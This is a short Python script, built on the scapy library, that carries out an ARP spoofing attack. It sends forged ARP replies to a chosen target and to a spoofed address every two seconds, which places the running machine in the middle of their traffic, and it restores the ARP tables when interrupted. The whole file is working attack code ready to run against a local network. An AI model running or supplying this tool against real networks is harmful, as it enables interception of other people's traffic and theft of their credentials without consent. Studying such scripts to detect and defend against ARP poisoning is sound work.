import scapy.all as scapy
from optparse import OptionParser
import time

def get_Options():
    parser = OptionParser()
    parser.add_option("-t" , "--target" , dest="target_ip" , help="Used to select Target")
    parser.add_option("-s" , "--spoof" , dest= "spoof_ip" , help="Used to select Spoof")
    ( options , arguments )  = parser.parse_args()
    
    # Excecption Handling for args
    if not options.target_ip:
        parser.error("Please specify target_ip!, use --help or -h to get more info.")
    elif not options.spoof_ip:
        parser.error("Please specify spoof_ip !, use --help or -h to get more info.")
    else:
        return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    src_dest = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast = src_dest/arp_request
    answered_list = scapy.srp(broadcast,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc

def send_packet(target_ip, spoof_ip):
    mac_address = get_mac(target_ip)
    packet = scapy.ARP(pdst=target_ip , hwdst=mac_address , op=2 ,psrc=spoof_ip)
    scapy.send(packet,verbose=False)

def remaping(dest_ip , src_ip):
    mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(pdst=dest_ip,hwdst=mac, op=2, psrc=src_ip ,hwsrc=src_mac)
    scapy.send(packet,count=4,verbose=False)

options = get_Options()
target_ip = options.target_ip
spoof_ip = options.spoof_ip

send_packet_value = 0
try:
    while True:
        send_packet(target_ip , spoof_ip)
        send_packet(spoof_ip , target_ip)
        send_packet_value += 2
        print("\r Packet Sended: "+ str(send_packet_value) ,end='')
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Quiting ... \nRestoring ARP...")
    remaping(target_ip , spoof_ip)
    remaping(spoof_ip , target_ip)



